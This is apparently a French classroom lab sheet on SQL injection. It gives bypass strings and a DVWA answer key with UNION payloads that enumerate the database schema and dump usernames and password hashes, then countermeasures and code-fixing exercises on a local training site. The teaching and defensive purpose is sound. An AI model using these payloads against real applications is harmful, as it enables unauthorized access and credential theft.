# TP ⚓️ Injection SQL

## 1. Les grands principes : Exploiter la faille SQL

**🎯 Objectif :** accéder aux données sans connaître les identifiants réels.

**💉 Definition :** Une injection SQL est un type d'exploitation d'une faille de sécurité d'une application interagissant avec une base de données, en injectant une requête SQL non prévue par le système et pouvant compromettre sa sécurité.

**🚧 Principes de bases :** provoquer des erreurs SQL pour faire apparâitre de nouvelles informations dans la pile d'execution des erreurs.

Dans le champ User ID, saisir :

```sql
Copier
Modifier
1' OR '1'='1
```
Essayer d'autres variantes :

```sql
Copier
Modifier
' OR 1=1 --
admin' --
' OR 'a'='a
```
Question : Que s’est-il passé au niveau de la requête SQL ?

Réponse attendue : La requête a été modifiée pour toujours retourner vrai (WHERE id = '' OR '1'='1'), contournant ainsi la logique de contrôle.

## 2. Application

### 2.1 Hack Splaining

![secure bank](./data/injectionSQL.png){: width=40% .center}

Avant d'utiliser WebGoat, nous allons nous focaliser sur la partie Injection SQL, pour ça nous allons utiliser le site [Hack Splaining](https://www.hacksplaining.com/exercises/sql-injection).

Celui-ci contient un bon « tutoriel » interactif permettant de tester et de se former au principe d’injections SQL.

### 2.2 DVWA

1.	Tester un User Id.
2.	Quelle est la page exécutée ?
3.	Donner la requête SQL exécutée ?
4.	Reproduire chaque étape comme précédemment et réaliser une documentation au fur et à mesure avec les explications détaillées et la requête SQL associée.

Vous pouvez vous aider du "tuto" suivant : [hackingarticles : manual-sql-injection-exploitation-step-step](https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/)

??? info "Element de correction"

    1. Test de vulnérabilité : En tapant simplement 1 dans le champ libre.
    2. Pour afficher tous les utilisateurs : `%' or '0'='0'` pour avoir une requête toujours vraie
    3. Afficher la version de la base de données : `%' or 0=0 union select null, version() #` (Dans la dernière ligne affichée, 10.1.28-MariaDB est affichée dans SURNAME c'est la version de MYSQL database.)
    4. Afficher toutes les tables INFORMATION_SCHEMA : `%' and 1=0 union select null, table_name from information_schema.tables #` (L’INFORMATION_SCHEMA est la base de données, l'endroit qui stocke des informations sur toutes les autres bases de données que le serveur MySQL entretient.)
    5. Afficher toutes les tables utilisateur d’INFORMATION_SCHEMA : `%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#` (toutes les tables qui commencent par le préfixe « user »
    dans la base de données INFORMATION_SCHEMA.)
    6. Afficher tous les champs de colonnes dans la table user d’INFORMATION_SCHEMA : `%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #` (toutes les colonnes dans la table users. Il y a les colonnes user_id, first_name, last_name, user et Password.)
    7. Afficher tous les contenus de champs de colonnes dans la table user d’INFORMATION_SCHEMA : `%'and 1=0 union select
    null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`

    nous avons réussi à montrer toutes les informations d'authentification nécessaires dans cette base de données. Il suffit de les décoder avec Hashkiller par exemple. Ici le mot de passe admin est : `password`

## 3. Contre-Mesures

Que faire pour empêcher ce type d'attaque ?

- Échapper ou paramétrer correctement les requêtes SQL (requêtes préparées avec PDO ou MySQLi)
- Ne jamais faire confiance aux données utilisateur
- Journaliser les tentatives suspectes
- Utiliser un WAF (pare-feu applicatif)

⁉️ Pourquoi ce type de faille est toujours fréquent ?

## 4. Le cas bijoo

Visualisez l'ensemble des produits de la catégorie Montres, observez bien l'url d'appel [http://localhost/breizhsecu/catalogue.php?cat=1](http://localhost/breizhsecu/catalogue.php?cat=1)

Vous allez désormais modifier l'url d'appel en remplaçant le ``1`` par ``1 or true``

et il y a bien d'autres failles SQL sur le site 😵 ...

**A faire :** 

1. Modifier la page catalogue.php de façon que l'on ne puisse pas avoir d'injection et voir d'autres catégories que celles prévues.
2. Sur la page du détail d'une commande lorsqu'on est logué, on peut accéder au détail d'une commande qui n'est pas à soi.
3. Corrigez le code de la page pour que l’on soit redirigé vers une page "vous n'avez pas accès" si la commande n'appartient pas à la personne loguée.
4. De la même façon, corrigez le script de suppression des avis qui ne doit fonctionner que lorsqu'on est connecté et que l’on souhaite supprimer son propre avis.